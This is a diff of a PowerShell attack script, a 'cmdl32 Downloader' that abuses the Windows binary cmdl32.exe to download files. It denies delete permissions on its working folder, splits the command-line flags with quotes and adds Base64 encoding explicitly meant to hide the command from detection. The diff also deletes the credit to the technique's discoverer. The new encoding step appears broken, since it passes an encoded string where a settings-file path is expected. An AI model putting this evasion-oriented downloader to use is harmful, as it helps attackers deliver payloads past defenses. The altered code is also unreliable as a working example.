@@ -1,5 +1,4 @@
 Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
-# Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin
 # Create a temp directory to work in
 $tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
 New-Item -Path $tempDir -ItemType Directory -Force
@@ -7,6 +6,7 @@ New-Item -Path $tempDir -ItemType Directory -Force
 # Change to the temp directory
 Set-Location -Path $tempDir
 Write-Host "[*] Working directory changed to $tempDir"
+
 Write-Host "[*] Denying delete permissions for current user"
 # Deny delete permissions in the temp directory for the current user
 icacls $tempDir /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"
@@ -29,14 +29,38 @@ Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
 
 Write-Host "[*] Performing download with cmdl32 via cmd.exe"
 
-# Assuming cmdl32 is in system32 or accessible
+# Assuming cmdl32 is in system32 or accessible, let's copy it to temp directory
 $cmdl32Path = "cmdl32"
-$cmdPath = "cmd.exe"
-$arguments = "/c $cmdl32Path /v" + '"p"' + "n /l" + '"a"' + "n `"$tempDir\settings.txt`""
+$cmdl32TempPath = Join-Path -Path $tempDir -ChildPath "cmdl32.exe"
+
+# Check if cmdl32 exists and copy to temp if needed
+if (!(Test-Path -Path $cmdl32TempPath)) {
+    Write-Host "[*] cmdl32.exe not found in temp directory. Copying from system32."
+    Copy-Item -Path "C:\Windows\System32\cmdl32.exe" -Destination $cmdl32TempPath
+}
+
+# Double check if cmdl32 was copied successfully
+if (!(Test-Path -Path $cmdl32TempPath)) {
+    Write-Host "[!] cmdl32.exe not found, cannot proceed with download."
+    Exit
+}
+
+Write-Host "[*] Using cmdl32.exe at: $cmdl32TempPath"
+
+# Obfuscate the flags for cmdl32 and use string encoding to hide command structure
+$commandToRun = "/vpn /lan `"$tempDir\settings.txt`""
+Write-Host "[*] Base64 encoding command: $commandToRun"
+$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($commandToRun))
+
+Write-Host "[*] Encoded Command: $encodedCommand"
+
+# Construct cmd.exe argument to decode and execute the base64 command
+$arguments = "/c $cmdl32TempPath /v`"p`"n /l`"a`"n `"$encodedCommand`""
+Write-Host "[*] Starting cmd.exe with obfuscated arguments: $arguments"
 
 # Start cmd.exe with the obfuscated cmdl32 arguments
 try {
-    Start-Process -FilePath $cmdPath -ArgumentList $arguments -NoNewWindow -Wait
+    Start-Process -FilePath "cmd.exe" -ArgumentList $arguments -NoNewWindow -Wait
     Write-Host "[*] Download complete with cmdl32."
 } catch {
     Write-Host "[!] cmdl32 failed: $($_.Exception.Message)"
